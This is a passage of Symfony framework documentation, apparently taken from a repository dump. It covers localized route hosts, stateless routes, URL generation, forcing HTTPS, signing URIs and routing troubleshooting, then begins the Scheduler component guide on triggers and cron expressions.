note::\n\n    If a route being imported includes the special :ref:`_locale <routing-locale-parameter>`\n    parameter in its own definition, Symfony will only import it for that locale\n    and not for the other configured locale prefixes.\n\n    E.g. if a route contains ``locale: 'en'`` in its definition and it's being\n    imported with ``en`` (prefix: empty) and ``nl`` (prefix: ``/nl``) locales,\n    that route will be available only in ``en`` locale and not in ``nl``.\n\nAnother common requirement is to host the website on a different domain\naccording to the locale. This can be done by defining a different host for each\nlocale.\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/routes/attributes.yaml\n        controllers:\n            resource: '../../src/Controller/'\n            type: attribute\n            host:\n                en: 'www.example.com'\n                nl: 'www.example.nl'\n\n    .. code-block:: xml\n\n        <!-- config/routes/attributes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n            <import resource=\"../../src/Controller/\" type=\"attribute\">\n                <host locale=\"en\">www.example.com</host>\n                <host locale=\"nl\">www.example.nl</host>\n            </import>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes/attributes.php\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n        return static function (RoutingConfigurator $routes): void {\n            $routes->import('../../src/Controller/', 'attribute')\n                ->host([\n                    'en' => 'www.example.com',\n                    'nl' => 'www.example.nl',\n                ])\n            ;\n        };\n\n.. _stateless-routing:\n\nStateless Routes\n----------------\n\nSometimes, when an HTTP response should be cached, it is important to ensure\nthat can happen. However, whenever a session is started during a request,\nSymfony turns the response into a private non-cacheable response.\n\nFor details, see :doc:`/http_cache`.\n\nRoutes can configure a ``stateless`` boolean option in order to declare that the\nsession shouldn't be used when matching a request:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/MainController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class MainController extends AbstractController\n        {\n            #[Route('/', name: 'homepage', stateless: true)]\n            public function homepage(): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        homepage:\n            controller: App\\Controller\\MainController::homepage\n            path: /\n            stateless: true\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n            <route id=\"homepage\" controller=\"App\\Controller\\MainController::homepage\" path=\"/\" stateless=\"true\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\MainController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('homepage', '/')\n                ->controller([MainController::class, 'homepage'])\n                ->stateless()\n            ;\n        };\n\nNow, if the session is used, the application will report it based on your\n``kernel.debug`` parameter:\n\n* ``enabled``: will throw an :class:`Symfony\\\\Component\\\\HttpKernel\\\\Exception\\\\UnexpectedSessionUsageException` exception\n* ``disabled``: will log a warning\n\nIt will help you understand and hopefully fixing unexpected behavior in your application.\n\n.. _routing-generating-urls:\n\nGenerating URLs\n---------------\n\nRouting systems are bidirectional:\n\n1. they associate URLs with controllers (as explained in the previous sections);\n2. they generate URLs for a given route.\n\nGenerating URLs from routes allows you to not write the ``<a href=\"...\">``\nvalues manually in your HTML templates. Also, if the URL of some route changes,\nyou only have to update the route configuration and all links will be updated.\n\nTo generate a URL, you need to specify the name of the route (e.g.\n``blog_show``) and the values of the parameters defined by the route (e.g.\n``slug = my-blog-post``).\n\nFor that reason each route has an internal name that must be unique in the\napplication. If you don't set the route name explicitly with the ``name``\noption, Symfony generates an automatic name based on the controller and action.\n\nSymfony declares route aliases based on the FQCN if the target class has an\n``__invoke()`` method that adds a route **and** if the target class added\none route exactly. Symfony also automatically adds an alias for every method\nthat defines only one route. Consider the following class::\n\n        // src/Controller/MainController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        final class MainController extends AbstractController\n        {\n            #[Route('/', name: 'homepage')]\n            public function homepage(): Response\n            {\n                // ...\n            }\n        }\n\nSymfony will add a route alias named ``App\\Controller\\MainController::homepage``.\n\nGenerating URLs in Controllers\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf your controller extends from the :ref:`AbstractController <the-base-controller-class-services>`,\nuse the ``generateUrl()`` helper::\n\n    // src/Controller/BlogController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n    use Symfony\\Component\\Routing\\Generator\\UrlGeneratorInterface;\n\n    class BlogController extends AbstractController\n    {\n        #[Route('/blog', name: 'blog_list')]\n        public function list(): Response\n        {\n            // generate a URL with no route arguments\n            $signUpPage = $this->generateUrl('sign_up');\n\n            // generate a URL with route arguments\n            $userProfilePage = $this->generateUrl('user_profile', [\n                'username' => $user->getUserIdentifier(),\n            ]);\n\n            // generated URLs are \"absolute paths\" by default. Pass a third optional\n            // argument to generate different URLs (e.g. an \"absolute URL\")\n            $signUpPage = $this->generateUrl('sign_up', [], UrlGeneratorInterface::ABSOLUTE_URL);\n\n            // when a route is localized, Symfony uses by default the current request locale\n            // pass a different '_locale' value if you want to set the locale explicitly\n            $signUpPageInDutch = $this->generateUrl('sign_up', ['_locale' => 'nl']);\n\n            // ...\n        }\n    }\n\n.. note::\n\n    If you pass to the ``generateUrl()`` method some parameters that are not\n    part of the route definition, they are included in the generated URL as a\n    query string::\n\n        $this->generateUrl('blog', ['page' => 2, 'category' => 'Symfony']);\n        // the 'blog' route only defines the 'page' parameter; the generated URL is:\n        // /blog/2?category=Symfony\n\n.. warning::\n\n    While objects are converted to string when used as placeholders, they are not\n    converted when used as extra parameters. So, if you're passing an object (e.g. an Uuid)\n    as value of an extra parameter, you need to explicitly convert it to a string::\n\n        $this->generateUrl('blog', ['uuid' => (string) $entity->getUuid()]);\n\nIf your controller does not extend from ``AbstractController``, you'll need to\n:ref:`fetch services in your controller <controller-accessing-services>` and\nfollow the instructions of the next section.\n\n.. _routing-generating-urls-in-services:\n\nGenerating URLs in Services\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nInject the ``router`` Symfony service into your own services and use its\n``generate()`` method. When using :doc:`service autowiring </service_container/autowiring>`\nyou only need to add an argument in the service constructor and type-hint it with\nthe :class:`Symfony\\\\Component\\\\Routing\\\\Generator\\\\UrlGeneratorInterface` class::\n\n    // src/Service/SomeService.php\n    namespace App\\Service;\n\n    use Symfony\\Component\\Routing\\Generator\\UrlGeneratorInterface;\n\n    class SomeService\n    {\n        public function __construct(\n            private UrlGeneratorInterface $urlGenerator,\n        ) {\n        }\n\n        public function someMethod(): void\n        {\n            // ...\n\n            // generate a URL with no route arguments\n            $signUpPage = $this->urlGenerator->generate('sign_up');\n\n            // generate a URL with route arguments\n            $userProfilePage = $this->urlGenerator->generate('user_profile', [\n                'username' => $user->getUserIdentifier(),\n            ]);\n\n            // generated URLs are \"absolute paths\" by default. Pass a third optional\n            // argument to generate different URLs (e.g. an \"absolute URL\")\n            $signUpPage = $this->urlGenerator->generate('sign_up', [], UrlGeneratorInterface::ABSOLUTE_URL);\n\n            // when a route is localized, Symfony uses by default the current request locale\n            // pass a different '_locale' value if you want to set the locale explicitly\n            $signUpPageInDutch = $this->urlGenerator->generate('sign_up', ['_locale' => 'nl']);\n        }\n    }\n\nGenerating URLs in Templates\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nRead the section about :ref:`creating links between pages <templates-link-to-pages>`\nin the main article about Symfony templates.\n\nGenerating URLs in JavaScript\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf your JavaScript code is included in a Twig template, you can use the\n``path()`` and ``url()`` Twig functions to generate the URLs and store them in\nJavaScript variables. The ``escape()`` filter is needed to escape any\nnon-JavaScript-safe values:\n\n.. code-block:: html+twig\n\n    <script>\n        const route = \"{{ path('blog_show', {slug: 'my-blog-post'})|escape('js') }}\";\n    </script>\n\nIf you need to generate URLs dynamically or if you are using pure JavaScript\ncode, this solution doesn't work. In those cases, consider using the\n`FOSJsRoutingBundle`_.\n\n.. _router-generate-urls-commands:\n\nGenerating URLs in Commands\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nGenerating URLs in commands works the same as\n:ref:`generating URLs in services <routing-generating-urls-in-services>`. The\nonly difference is that commands are not executed in the HTTP context. Therefore,\nif you generate absolute URLs, you'll get ``http://localhost/`` as the host name\ninstead of your real host name.\n\nThe solution is to configure the ``default_uri`` option to define the\n\"request context\" used by commands when they generate URLs:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/routing.yaml\n        framework:\n            router:\n                # ...\n                default_uri: 'https://example.org/my/path/'\n\n    .. code-block:: xml\n\n        <!-- config/packages/routing.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:router default-uri=\"https://example.org/my/path/\">\n                    <!-- ... -->\n                </framework:router>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/routing.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->router()->defaultUri('https://example.org/my/path/');\n        };\n\nNow you'll get the expected results when generating URLs in your commands::\n\n    // src/Command/SomeCommand.php\n    namespace App\\Command;\n\n    use Symfony\\Component\\Console\\Command\\Command;\n    use Symfony\\Component\\Console\\Input\\InputInterface;\n    use Symfony\\Component\\Console\\Output\\OutputInterface;\n    use Symfony\\Component\\Routing\\Generator\\UrlGeneratorInterface;\n    // ...\n\n    class SomeCommand extends Command\n    {\n        public function __construct(private UrlGeneratorInterface $urlGenerator)\n        {\n            parent::__construct();\n        }\n\n        protected function execute(InputInterface $input, OutputInterface $output): int\n        {\n            // generate a URL with no route arguments\n            $signUpPage = $this->urlGenerator->generate('sign_up');\n\n            // generate a URL with route arguments\n            $userProfilePage = $this->urlGenerator->generate('user_profile', [\n                'username' => $user->getUserIdentifier(),\n            ]);\n\n            // by default, generated URLs are \"absolute paths\". Pass a third optional\n            // argument to generate different URIs (e.g. an \"absolute URL\")\n            $signUpPage = $this->urlGenerator->generate('sign_up', [], UrlGeneratorInterface::ABSOLUTE_URL);\n\n            // when a route is localized, Symfony uses by default the current request locale\n            // pass a different '_locale' value if you want to set the locale explicitly\n            $signUpPageInDutch = $this->urlGenerator->generate('sign_up', ['_locale' => 'nl']);\n\n            // ...\n        }\n    }\n\n.. note::\n\n    By default, the URLs generated for web assets use the same ``default_uri``\n    value, but you can change it with the ``asset.request_context.base_path``\n    and ``asset.request_context.secure`` container parameters.\n\nChecking if a Route Exists\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIn highly dynamic applications, it may be necessary to check whether a route\nexists before using it to generate a URL. In those cases, don't use the\n:method:`Symfony\\\\Component\\\\Routing\\\\Router::getRouteCollection` method because\nthat regenerates the routing cache and slows down the application.\n\nInstead, try to generate the URL and catch the\n:class:`Symfony\\\\Component\\\\Routing\\\\Exception\\\\RouteNotFoundException` thrown\nwhen the route doesn't exist::\n\n    use Symfony\\Component\\Routing\\Exception\\RouteNotFoundException;\n\n    // ...\n\n    try {\n        $url = $this->router->generate($routeName, $routeParameters);\n    } catch (RouteNotFoundException $e) {\n        // the route is not defined...\n    }\n\n.. _routing-force-https:\n\nForcing HTTPS on Generated URLs\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. note::\n\n    If your server runs behind a proxy that terminates SSL, make sure to\n    :doc:`configure Symfony to work behind a proxy </deployment/proxies>`\n\n    The configuration for the scheme is only used for non-HTTP requests.\n    The ``schemes`` option together with incorrect proxy configuration will\n    lead to a redirect loop.\n\nBy default, generated URLs use the same HTTP scheme as the current request.\nIn console commands, where there is no HTTP request, URLs use ``http`` by\ndefault. You can change this per command (via the router's ``getContext()``\nmethod) or globally with these configuration parameters:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        parameters:\n            router.request_context.scheme: 'https'\n            asset.request_context.secure: true\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <parameters>\n                <parameter key=\"router.request_context.scheme\">https</parameter>\n                <parameter key=\"asset.request_context.secure\">true</parameter>\n            </parameters>\n\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        $container->parameters()\n            ->set('router.request_context.scheme', 'https')\n            ->set('asset.request_context.secure', true)\n        ;\n\nOutside of console commands, use the ``schemes`` option to define the scheme of\neach route explicitly:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Controller/SecurityController.php\n        namespace App\\Controller;\n\n        use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n        use Symfony\\Component\\HttpFoundation\\Response;\n        use Symfony\\Component\\Routing\\Attribute\\Route;\n\n        class SecurityController extends AbstractController\n        {\n            #[Route('/login', name: 'login', schemes: ['https'])]\n            public function login(): Response\n            {\n                // ...\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/routes.yaml\n        login:\n            path:       /login\n            controller: App\\Controller\\SecurityController::login\n            schemes:    [https]\n\n    .. code-block:: xml\n\n        <!-- config/routes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <route id=\"login\" path=\"/login\" schemes=\"https\"\n                   controller=\"App\\Controller\\SecurityController::login\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes.php\n        use App\\Controller\\SecurityController;\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->add('login', '/login')\n                ->controller([SecurityController::class, 'login'])\n                ->schemes(['https'])\n            ;\n        };\n\nThe URL generated for the ``login`` route will always use HTTPS. This means that\nwhen using the ``path()`` Twig function to generate URLs, you may get an\nabsolute URL instead of a relative URL if the HTTP scheme of the original\nrequest is different from the scheme used by the route:\n\n.. code-block:: twig\n\n    {# if the current scheme is HTTPS, generates a relative URL: /login #}\n    {{ path('login') }}\n\n    {# if the current scheme is HTTP, generates an absolute URL to change\n       the scheme: https://example.com/login #}\n    {{ path('login') }}\n\nThe scheme requirement is also enforced for incoming requests. If you try to\naccess the ``/login`` URL with HTTP, you will automatically be redirected to the\nsame URL, but with the HTTPS scheme.\n\nIf you want to force a group of routes to use HTTPS, you can define the default\nscheme when importing them. The following example forces HTTPS on all routes\ndefined as attributes:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/routes/attributes.yaml\n        controllers:\n            resource: '../../src/Controller/'\n            type: attribute\n            schemes: [https]\n\n    .. code-block:: xml\n\n        <!-- config/routes/attributes.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <routes xmlns=\"http://symfony.com/schema/routing\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/routing\n                https://symfony.com/schema/routing/routing-1.0.xsd\">\n\n            <import resource=\"../../src/Controller/\" type=\"attribute\" schemes=\"https\"/>\n        </routes>\n\n    .. code-block:: php\n\n        // config/routes/attributes.php\n        use Symfony\\Component\\Routing\\Loader\\Configurator\\RoutingConfigurator;\n\n        return static function (RoutingConfigurator $routes): void {\n            $routes->import('../../src/Controller/', 'attribute')\n                ->schemes(['https'])\n            ;\n        };\n\n.. note::\n\n    The Security component provides\n    :doc:`another way to enforce HTTP or HTTPS </security/force_https>`\n    via the ``requires_channel`` setting.\n\nSigning URIs\n~~~~~~~~~~~~\n\nA signed URI is an URI that includes a hash value that depends on the contents of\nthe URI. This way, you can later check the integrity of the signed URI by\nrecomputing its hash value and comparing it with the hash included in the URI.\n\nSymfony provides a utility to sign URIs via the :class:`Symfony\\\\Component\\\\HttpFoundation\\\\UriSigner`\nservice, which you can inject in your services or controllers::\n\n    // src/Service/SomeService.php\n    namespace App\\Service;\n\n    use Symfony\\Component\\HttpFoundation\\UriSigner;\n\n    class SomeService\n    {\n        public function __construct(\n            private UriSigner $uriSigner,\n        ) {\n        }\n\n        public function someMethod(): void\n        {\n            // ...\n\n            // generate a URL yourself or get it somehow...\n            $url = 'https://example.com/foo/bar?sort=desc';\n\n            // sign the URL (it adds a query parameter called '_hash')\n            $signedUrl = $this->uriSigner->sign($url);\n            // $url = 'https://example.com/foo/bar?sort=desc&_hash=e4a21b9'\n\n            // check the URL signature\n            $uriSignatureIsValid = $this->uriSigner->check($signedUrl);\n            // $uriSignatureIsValid = true\n\n            // if you have access to the current Request object, you can use this\n            // other method to pass the entire Request object instead of the URI:\n            $uriSignatureIsValid = $this->uriSigner->checkRequest($request);\n        }\n    }\n\nFor security reasons, it's common to make signed URIs expire after some time\n(e.g. when using them to reset user credentials). By default, signed URIs don't\nexpire, but you can define an expiration date/time using the ``$expiration``\nargument of :method:`Symfony\\\\Component\\\\HttpFoundation\\\\UriSigner::sign`::\n\n    // src/Service/SomeService.php\n    namespace App\\Service;\n\n    use Symfony\\Component\\HttpFoundation\\UriSigner;\n\n    class SomeService\n    {\n        public function __construct(\n            private UriSigner $uriSigner,\n        ) {\n        }\n\n        public function someMethod(): void\n        {\n            // ...\n\n            // generate a URL yourself or get it somehow...\n            $url = 'https://example.com/foo/bar?sort=desc';\n\n            // sign the URL with an explicit expiration date\n            $signedUrl = $this->uriSigner->sign($url, new \\DateTimeImmutable('2050-01-01'));\n            // $signedUrl = 'https://example.com/foo/bar?sort=desc&_expiration=2524608000&_hash=e4a21b9'\n\n            // if you pass a \\DateInterval, it will be added from now to get the expiration date\n            $signedUrl = $this->uriSigner->sign($url, new \\DateInterval('PT10S'));  // valid for 10 seconds from now\n            // $signedUrl = 'https://example.com/foo/bar?sort=desc&_expiration=1712414278&_hash=e4a21b9'\n\n            // you can also use a timestamp in seconds\n            $signedUrl = $this->uriSigner->sign($url, 4070908800); // timestamp for the date 2099-01-01\n            // $signedUrl = 'https://example.com/foo/bar?sort=desc&_expiration=4070908800&_hash=e4a21b9'\n        }\n    }\n\n.. note::\n\n    The expiration date/time is included in the signed URIs as a timestamp via\n    the ``_expiration`` query parameter.\n\n.. versionadded:: 7.1\n\n    The feature to add an expiration date for a signed URI was introduced in Symfony 7.1.\n\n.. note::\n\n    The generated URI hashes may include the ``/`` and ``+`` characters, which\n    can cause issues with certain clients. If you encounter this problem, replace\n    them using the following: ``strtr($hash, ['/' => '_', '+' => '-'])``.\n\nTroubleshooting\n---------------\n\nHere are some common errors you might see while working with routing:\n\n.. code-block:: text\n\n    Controller \"App\\\\Controller\\\\BlogController::show()\" requires that you\n    provide a value for the \"$slug\" argument.\n\nThis happens when your controller method has an argument (e.g. ``$slug``)::\n\n    public function show(string $slug): Response\n    {\n        // ...\n    }\n\nBut your route path does *not* have a ``{slug}`` parameter (e.g. it is\n``/blog/show``). Add a ``{slug}`` to your route path: ``/blog/show/{slug}`` or\ngive the argument a default value (i.e. ``$slug = null``).\n\n.. code-block:: text\n\n    Some mandatory parameters are missing (\"slug\") to generate a URL for route\n    \"blog_show\".\n\nThis means that you're trying to generate a URL to the ``blog_show`` route but\nyou are *not* passing a ``slug`` value (which is required, because it has a\n``{slug}`` parameter in the route path). To fix this, pass a ``slug`` value when\ngenerating the route::\n\n    $this->generateUrl('blog_show', ['slug' => 'slug-value']);\n\nor, in Twig:\n\n.. code-block:: twig\n\n    {{ path('blog_show', {slug: 'slug-value'}) }}\n\nLearn more about Routing\n------------------------\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    routing/*\n\n.. _`PHP regular expressions`: https://www.php.net/manual/en/book.pcre.php\n.. _`PCRE Unicode properties`: https://www.php.net/manual/en/regexp.reference.unicode.php\n.. _`FOSJsRoutingBundle`: https://github.com/FriendsOfSymfony/FOSJsRoutingBundle\n.. _`backed enumerations`: https://www.php.net/manual/en/language.enumerations.backed.php\n"
        },
        {
          "name": "routing",
          "type": "tree",
          "content": null
        },
        {
          "name": "scheduler.rst",
          "type": "blob",
          "size": 35.6455078125,
          "content": "Scheduler\n=========\n\nThe scheduler component manages task scheduling within your PHP application, like\nrunning a task each night at 3 AM, every two weeks except for holidays or any\nother custom schedule you might need.\n\nThis component is useful to schedule tasks like maintenance (database cleanup,\ncache clearing, etc.), background processing (queue handling, data synchronization,\netc.), periodic data updates, scheduled notifications (emails, alerts), and more.\n\nThis document focuses on using the Scheduler component in the context of a full\nstack Symfony application.\n\nInstallation\n------------\n\nIn applications using :ref:`Symfony Flex <symfony-flex>`, run this command to\ninstall the scheduler component:\n\n.. code-block:: terminal\n\n    $ composer require symfony/scheduler\n\n.. tip::\n\n    Starting in `MakerBundle`_ ``v1.58.0``, you can run ``php bin/console make:schedule``\n    to generate a basic schedule, that you can customize to create your own Scheduler.\n\nSymfony Scheduler Basics\n------------------------\n\nThe main benefit of using this component is that automation is managed by your\napplication, which gives you a lot of flexibility that is not possible with cron\njobs (e.g. dynamic schedules based on certain conditions).\n\nAt its core, the Scheduler component allows you to create a task (called a message)\nthat is executed by a service and repeated on some schedule. It has some similarities\nwith the :doc:`Symfony Messenger </components/messenger>` component (such as message,\nhandler, bus, transport, etc.), but the main difference is that Messenger can't\ndeal with repetitive tasks at regular intervals.\n\nConsider the following example of an application that sends some reports to\ncustomers on a scheduled basis. First, create a Scheduler message that represents\nthe task of creating a report::\n\n    // src/Scheduler/Message/SendDailySalesReports.php\n    namespace App\\Scheduler\\Message;\n\n    class SendDailySalesReports\n    {\n        public function __construct(private int $id) {}\n\n        public function getId(): int\n        {\n            return $this->id;\n        }\n    }\n\nNext, create the handler that processes that kind of message::\n\n    // src/Scheduler/Handler/SendDailySalesReportsHandler.php\n    namespace App\\Scheduler\\Handler;\n\n    use App\\Scheduler\\Message\\SendDailySalesReports;\n    use Symfony\\Component\\Messenger\\Attribute\\AsMessageHandler;\n\n    #[AsMessageHandler]\n    class SendDailySalesReportsHandler\n    {\n        public function __invoke(SendDailySalesReports $message)\n        {\n            // ... do some work to send the report to the customers\n        }\n    }\n\nInstead of sending these messages immediately (as in the Messenger component),\nthe goal is to create them based on a predefined frequency. This is possible\nthanks to :class:`Symfony\\\\Component\\\\Scheduler\\\\Messenger\\\\SchedulerTransport`,\na special transport for Scheduler messages.\n\nThe transport generates, autonomously, various messages according to the assigned\nfrequencies. The following images illustrate the differences between the\nprocessing of messages in Messenger and Scheduler components:\n\nIn Messenger:\n\n.. image:: /_images/components/messenger/basic_cycle.png\n    :alt: Symfony Messenger basic cycle\n\nIn Scheduler:\n\n.. image:: /_images/components/scheduler/scheduler_cycle.png\n    :alt: Symfony Scheduler basic cycle\n\nAnother important difference is that messages in the Scheduler component are\nrecurring. They are represented via the :class:`Symfony\\\\Component\\\\Scheduler\\\\RecurringMessage`\nclass.\n\n.. _scheduler_attaching-recurring-messages:\n\nAttaching Recurring Messages to a Schedule\n------------------------------------------\n\nThe configuration of the message frequency is stored in a class that implements\n:class:`Symfony\\\\Component\\\\Scheduler\\\\ScheduleProviderInterface`. This provider\nuses the method :method:`Symfony\\\\Component\\\\Scheduler\\\\ScheduleProviderInterface::getSchedule`\nto return a schedule containing the different recurring messages.\n\nThe :class:`Symfony\\\\Component\\\\Scheduler\\\\Attribute\\\\AsSchedule` attribute,\nwhich by default references the schedule named ``default``, allows you to register\non a particular schedule::\n\n    // src/Scheduler/SaleTaskProvider.php\n    namespace App\\Scheduler;\n\n    use Symfony\\Component\\Scheduler\\Attribute\\AsSchedule;\n    use Symfony\\Component\\Scheduler\\Schedule;\n    use Symfony\\Component\\Scheduler\\ScheduleProviderInterface;\n\n    #[AsSchedule]\n    class SaleTaskProvider implements ScheduleProviderInterface\n    {\n        public function getSchedule(): Schedule\n        {\n            // ...\n        }\n    }\n\n.. tip::\n\n    By default, the schedule name is ``default`` and the transport name follows\n    the syntax: ``scheduler_nameofyourschedule`` (e.g. ``scheduler_default``).\n\n.. tip::\n\n    `Memoizing`_ your schedule is a good practice to prevent unnecessary reconstruction\n    if the ``getSchedule()`` method is checked by another service.\n\nScheduling Recurring Messages\n-----------------------------\n\nA ``RecurringMessage`` is a message associated with a trigger, which configures\nthe frequency of the message. Symfony provides different types of triggers:\n\n:class:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\CronExpressionTrigger`\n    A trigger that uses the same syntax as the `cron command-line utility`_.\n\n:class:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\CallbackTrigger`\n    A trigger that uses a callback to determine the next run date.\n\n:class:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\ExcludeTimeTrigger`\n    A trigger that excludes certain times from a given trigger.\n\n:class:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\JitterTrigger`\n    A trigger that adds a random jitter to a given trigger. The jitter is some\n    time that is added to the original triggering date/time. This\n    allows to distribute the load of the scheduled tasks instead of running them\n    all at the exact same time.\n\n:class:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\PeriodicalTrigger`\n    A trigger that uses a ``DateInterval`` to determine the next run date.\n\nThe :class:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\JitterTrigger` and\n:class:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\ExcludeTimeTrigger` are decorators\nand modify the behavior of the trigger they wrap. You can get the decorated\ntrigger as well as the decorators by calling the\n:method:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\AbstractDecoratedTrigger::inner`\nand :method:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\AbstractDecoratedTrigger::decorators`\nmethods::\n\n    $trigger = new ExcludeTimeTrigger(new JitterTrigger(CronExpressionTrigger::fromSpec('#midnight', new MyMessage()));\n\n    $trigger->inner(); // CronExpressionTrigger\n    $trigger->decorators(); // [ExcludeTimeTrigger, JitterTrigger]\n\nMost of them can be created via the :class:`Symfony\\\\Component\\\\Scheduler\\\\RecurringMessage`\nclass, as shown in the following examples.\n\nCron Expression Triggers\n~~~~~~~~~~~~~~~~~~~~~~~~\n\nBefore using cron triggers, you have to install the following dependency:\n\n.. code-block:: terminal\n\n    $ composer require dragonmantank/cron-expression\n\nThen, define the trigger date/time using the same syntax as the\n`cron command-line utility`_::\n\n    RecurringMessage::cron('* * * * *', new Message());\n\n    // optionally you can define the timezone used by the cron expression\n    RecurringMessage::cron('* * * * *', new Message(), new \\DateTimeZone('Africa/Malabo'));\n\n.. tip::\n\n    Check out the `crontab.guru website`_ if you need help to construct/understand\n    cron expressions.\n\nYou can also use some special values that represent common cron expressions:\n\n* ``@yearly``, ``@annually`` - Run once a year, midnight, Jan. 1 - ``0 0 1 1 *``\n* ``@monthly`` - Run once a month, midnight, first of month - ``0 0 1 * *``\n* ``@weekly`` - Run once a week, midnight on Sun - ``0 0 * * 0``\n* ``@daily``, ``@midnight`` - Run once a day, midnight - ``0 0 * * *``\n* ``@hourly`` - Run once an hour, first minute - ``0 * * * *``\n\nFor example::\n\n    RecurringMessage::cron('@daily', new Message());\n\n.. tip::\n\n    You can also define cron tasks using :ref:`the AsCronTask attribute <scheduler-attributes-cron-task>`.\n\nHashed Cron Expressions\n.......................\n\nIf you have many triggers scheduled at same time (for example, at midnight, ``0 0 * * *``)\nthis will create a very long running list of schedules at that exact time.\nThis may cause an issue if a task has a memory leak.\n\nYou can add a hash symbol (``#``) in expressions to generate random values.\nAthough the values are random, they are predictable and consistent because they\nare generated based on the message. A message with string representation ``my task``\nand a defined frequency of ``# # * * *`` will have an idempotent frequency\nof ``56 20 * * *`` (every day at 8:56pm).\n\nYou can also use hash ranges (``#(x-y)``) to define the list of possible values\nfor that random part. For example, ``# #(0-7) * * *`` means daily, some time\nbetween midnight and 7am. Using the ``#`` without a range creates a range of any\nvalid value for the field. ``# # # # #`` is short for ``#(0-59) #(0-23) #(1-28)\n#(1-12) #(0-6)``.\n\nYou can also use some special values that represent common hashed cron expressions:\n\n======================  ========================================================================\nAlias                   Converts to\n======================  ========================================================================\n``#hourly``             ``# * * * *`` (at some minute every hour)\n``#daily``              ``# # * * *`` (at some time every day)\n``#weekly``             ``# # * * #`` (at some time every week)\n``#weekly@midnight``    ``# #(0-2) * * #`` (at ``#midnight`` one day every 